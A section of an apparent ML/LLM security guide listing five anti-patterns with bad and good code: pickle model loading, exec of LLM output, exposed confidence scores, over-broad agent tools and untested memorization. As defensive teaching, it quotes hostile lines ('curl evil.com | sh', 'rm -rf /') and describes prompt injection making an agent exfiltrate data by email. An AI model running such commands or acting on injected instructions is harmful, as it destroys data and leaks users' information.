## 10. Common Pitfalls & Anti-Patterns

### 🔴 High Severity

**Anti-Pattern 1: Using Pickle for Model Serialization

```markdown
❌ BAD: Saving/loading models with pickle (allows arbitrary code execution)
  torch.save(model, 'model.pkl')          # Uses pickle under the hood
  model = torch.load('untrusted_model.pkl')  # Executes any embedded code

✅ GOOD: Use safetensors format (safe tensor serialization, no code execution)
  from safetensors.torch import save_file, load_file
  save_file(model.state_dict(), 'model.safetensors')
  state_dict = load_file('model.safetensors')
  model.load_state_dict(state_dict)

Why it matters: A malicious pickle file can execute os.system("rm -rf /") on load
— any model downloaded from an untrusted source is a potential RCE vector.
```

**Anti-Pattern 2: Trusting LLM Output as Code

```markdown
❌ BAD: Direct eval of LLM-generated code
  code = llm.generate("Write Python to query the database")
  exec(code)   # LLM output could be: __import__('os').system('curl evil.com | sh')

✅ GOOD: Sandboxed execution with allowlist
  from RestrictedPython import compile_restricted
  code = llm.generate(prompt)
  compiled = compile_restricted(code, '<string>', 'exec')
  safe_globals = {'__builtins__': safe_builtins}
  exec(compiled, safe_globals)
  # OR: use subprocess with seccomp/AppArmor profile

Why it matters: Code injection via LLM is a class of prompt injection that bypasses
all prompt-level guardrails by shifting execution to the Python interpreter.
```

### 🟡 Medium Severity

**Anti-Pattern 3: Exposing Model Confidence Scores

```markdown
❌ BAD: Returning raw probability scores in API response
  return {"prediction": "cat", "confidence": 0.9987}
  # Enables black-box adversarial attacks using score as gradient signal
  # Enables membership inference (training examples have higher confidence)

✅ GOOD: Return only hard labels; add calibration noise if scores needed
  return {"prediction": "cat"}
  # If confidence required: add Laplace noise: conf + Laplace(0, 0.05)

Why it matters: CIFAR-10 models with confidence exposed can be attacked with
< 100 queries using NES (Natural Evolution Strategies); without scores, attacks
need 100× more queries or fail entirely.
```

**Anti-Pattern 4: Infinite Agent Tool Permissions

```markdown
❌ BAD: Agent with access to file system, email, database, and internet simultaneously
  tools = [ReadFileTool(), WriteFileTool(), SendEmailTool(),
           DatabaseTool(), WebSearchTool(), ShellTool()]
  agent.run(user_input)  # Successful injection → agent exfiltrates all data via email

✅ GOOD: Minimal tool scope per task; human-in-the-loop for high-risk actions
  # Read-only tools for research tasks
  tools = [ReadFileTool(allowed_paths=['/docs/']), WebSearchTool()]
  # Require confirmation for any write/send action
  agent.run(user_input, require_confirmation=['SendEmail', 'WriteFile'])

Why it matters: OWASP LLM08 Excessive Agency — agents with broad permissions
are a force multiplier for prompt injection attacks.
```

**Anti-Pattern 5: Skipping Membership Inference Testing

```markdown
❌ BAD: Deploying model without testing for training data memorization
  # Model trained on customer PII; deployed without privacy audit
  # Attacker queries: model(customer_name) → higher confidence = in training set
  # → 72h GDPR breach notification required

✅ GOOD: Run shadow model membership inference test pre-deployment
  from ml_privacy_meter import audit
  results = audit.run_mi_attack(
      target_model=model, train_data=train_set,
      test_data=holdout_set, attack_type='shadow'
  )
  assert results['advantage'] < 0.05, "Privacy risk too high for deployment"

Why it matters: GDPR Art. 5(1)(e) data minimization and Art. 35 DPIA require
demonstrable privacy protection; membership inference advantage > 0.1 typically
fails regulatory scrutiny.
```

---

